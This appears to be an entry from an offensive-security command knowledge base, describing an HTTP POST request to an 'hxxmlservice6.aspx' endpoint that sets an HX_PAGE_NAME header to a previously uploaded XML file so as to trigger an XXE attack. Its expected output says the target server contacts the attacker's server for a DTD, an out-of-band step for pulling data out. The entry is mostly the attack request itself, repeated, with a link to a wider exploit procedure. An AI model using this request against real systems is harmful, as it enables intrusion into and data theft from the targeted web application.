---
data: >-
  POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1

  HX_PAGE_NAME="tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml"
tags:
  - xxe
  - post-request
type: command
executor: bash
platforms:
  - Web
id: a985f369-cc99-4e89-aff2-e412fc324bb0
created_at: '2025-12-13T09:00:33.857Z'
updated_at: '2025-12-13T09:00:33.857Z'
verified: false
validated: true
submitted: true
---
# post-xxe-trigger-via-hxxmlservice

## Command

```bash
POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1
HX_PAGE_NAME="tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml"
```

## Description

Alternative POST request to trigger XML parsing and XXE via header modification after uploading the XML file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `HX_PAGE_NAME` | Specifies the path to the uploaded XML file | Yes |

## Examples

### Basic Usage

```bash
POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1
HX_PAGE_NAME="tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml"
```

## Expected Output

Server visits attacker's server to get DTD file.

## Related

- [[procedures/Exploit-XXE-via-Malicious-XML-Upload]]
